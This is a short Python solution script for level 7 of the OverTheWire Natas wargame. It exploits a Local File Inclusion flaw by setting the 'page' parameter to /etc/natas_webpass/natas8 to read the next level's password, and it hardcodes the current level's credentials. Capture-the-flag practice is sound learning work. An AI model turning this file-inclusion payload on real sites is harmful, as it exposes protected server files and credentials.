import requests
import config
import utils

"""
exploitation using Local File Inclusion (LFI).
1. access the url via the browser 
2. click on one of the links, e.g. http://natas7.natas.labs.overthewire.org/index.php?page=about
3. replace the value of the query with /etc/natas_webpass/natas8, 
   i.e. http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
"""

username = "natas7"
password = "jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr"
url = config.BASE_URL.format(username)
auth = (username, password)
path_to_password = "/index.php?page=/etc/natas_webpass/natas8"

url_to_password = url + path_to_password

r_to_password = requests.get(url_to_password, auth=auth)

utils.save_file("output.txt", r_to_password.text)